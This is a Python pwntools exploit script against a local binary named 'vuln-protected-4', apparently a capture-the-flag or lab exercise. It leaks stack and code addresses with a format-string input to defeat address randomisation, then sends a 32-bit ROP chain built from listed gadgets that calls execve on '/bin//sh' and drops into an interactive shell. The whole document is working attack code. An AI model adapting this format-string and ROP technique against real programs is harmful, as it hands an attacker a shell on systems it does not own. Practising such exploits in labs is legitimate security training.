#!/usr/bin/env python3

from pwn import *


############### IN USAGE ## #################
# 0x00033564 : mov dword ptr [eax], edx ; ret i
# 0x0006a883 : add al, 0x8b ; inc eax ; pop eax ; ret
# 0x0001fc5e : pop edx ; pop ebx ; pop esi ; ret
# 0x0000301e : pop ebx ; ret 
# 0x0001de41 : pop ecx ; add al, 0xf6 ; ret
# 0x00004862 : int 0x80


#not is usage, but works
def write_to_mem(addr, val):
   return set_eax(addr) + set_edx_ebx(val,0) + p32(offset + 0x00033564)

def set_eax(eax):
    return p32(offset + 0x0006a883) + p32(eax)

def set_edx_ebx(edx, ebx):
    return p32(offset + 0x0001fc5e) + p32(edx) + p32(ebx) + p32(0xfadeface)

def set_ebx(val):
    return p32(offset + 0x0000301e) + p32(val)

def set_ecx(val):
    return p32(offset + 0x0001de41) + p32(val)

def int80():
    return p32(offset + 0x00004862)



p = process('./vuln-protected-4')

# retrive offset and buffor addres
p.sendline("%p" * 7)
data = p.readline()
data = data.split(b"0x")
for i in range(len(data)):
    log.info("{} {}".format(i, data[i]))

offset = int(data[3],16) - 0x00003f90
log.info("START_OF_TEXT: 0x%08x" % offset)

buffor = int(data[1],16) - 0xd4
log.info("BUFOR: 0x%08x" % buffor)


# shellcode
padding_len = 28

shellcode = b''.join([
    p32(u32('/bin')),
    p32(u32('//sh')),
    p32(0),
    b"A" * (28 - 12),
    set_ecx(0x0),
    set_eax(0xb),
    set_edx_ebx(0x0, buffor),
    int80()
])

p.sendline(shellcode)

p.interactive()
